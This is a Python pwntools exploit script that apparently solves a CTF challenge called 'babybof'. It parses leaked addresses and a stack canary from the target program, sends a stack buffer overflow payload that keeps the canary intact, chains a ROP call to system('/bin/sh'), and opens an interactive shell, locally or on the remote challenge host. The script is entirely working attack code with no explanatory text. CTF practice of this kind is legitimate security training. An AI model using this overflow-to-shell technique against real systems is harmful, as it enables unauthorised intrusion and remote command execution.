from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("babybof.chal.imaginaryctf.org", 1337)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

io.recvuntil(" @ ", drop=True)
system = int(io.recvline(), 16)
io.recvuntil(" @ ", drop=True)
pop_rdi = int(io.recvline(), 16)
io.recvuntil(" @ ", drop=True)
ret = int(io.recvline(), 16)
io.recvuntil(" @ ", drop=True)
binsh = int(io.recvline(), 16)
io.recvuntil("canary: ", drop=True)
canary = int(io.recvline(), 16)

payload = b"a" * 0x38 + p64(canary)
payload += p64(0x0)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
io.sendlineafter("enter your input (make sure your stack is aligned!)", payload)

io.interactive()
